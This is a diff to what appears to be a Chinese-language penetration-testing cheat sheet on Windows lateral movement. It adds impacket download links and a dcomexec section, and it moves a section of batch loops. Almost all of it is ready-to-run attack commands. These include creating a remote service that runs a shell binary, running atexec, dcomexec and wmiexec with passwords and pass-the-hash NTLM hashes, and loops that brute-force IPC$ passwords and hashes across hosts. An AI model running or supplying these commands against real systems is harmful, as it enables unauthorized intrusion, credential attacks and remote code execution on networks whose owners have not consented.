@@ -523,9 +523,10 @@ sc \\192.168.210.107 create hackerbinpath="c:\shell1.exe"   #创建服务
 sc \\192.168.210.107 start hacker      #启动hacker服务
 ```
 
-## impacket命令
+## impacket包横向命令
 
-下载https://github.com/maaaaz/impacket-examples-windows   
+下载https://github.com/maaaaz/impacket-examples-windows     
+https://github.com/ropnop/impacket_static_binaries/releases   
 Atexec
 ```
 需要445端口开启
@@ -533,16 +534,14 @@ Atexec.exe hacker/administrator:abc123@192.168.202.148 "whoami"
 
 Atexec.exe -hashes :fac5d668099409cb6fa223a32ea493b6 hacker/administrator@192.168.202.148 "whoami"
 ```
-批量,需要保存为bat执行
+
+
+dcomexec
 ```
-用已知密码和用户，批量连接ip:
-FOR /F %%i in (ips.txt) do net use \%%i\ipc$ “password” /user:hacker\administrator
+需要135端口开启
+dcomexec.exe hacker/administrator:abc123@192.168.202.148 "whoami"
 
-已知用户和ip，批量连接密码(爆破密码)：
-FOR /F %%i in (pass.txt) do net use \192.168.202.148\ipc$ "%%i" /user:test\administrator
-
-已知用户和ip，批量连接hash(爆破hash)：
-FOR /F %%i in (hash.txt) do atexec.exe -hashes :"%%i" test/administrator@192.168.202.148 "whoami"
+dcomexec.exe -hashes :fac5d668099409cb6fa223a32ea493b6 hacker/administrator@192.168.202.148 "whoami"
 ```
 
 psexec
@@ -579,6 +578,17 @@ Wmiexec -hashes :fac5d668099409cb6fa223a32ea493b6 test/Administrator@192.168.202
 
 ```
 
+批量操作,需要保存为bat执行
+```
+用已知密码和用户，批量连接ip:
+FOR /F %%i in (ips.txt) do net use \%%i\ipc$ “password” /user:hacker\administrator
+
+已知用户和ip，批量连接密码(爆破密码)：
+FOR /F %%i in (pass.txt) do net use \192.168.202.148\ipc$ "%%i" /user:test\administrator
+
+已知用户和ip，批量连接hash(爆破hash)：
+FOR /F %%i in (hash.txt) do atexec.exe -hashes :"%%i" test/administrator@192.168.202.148 "whoami"
+```
 
 
 
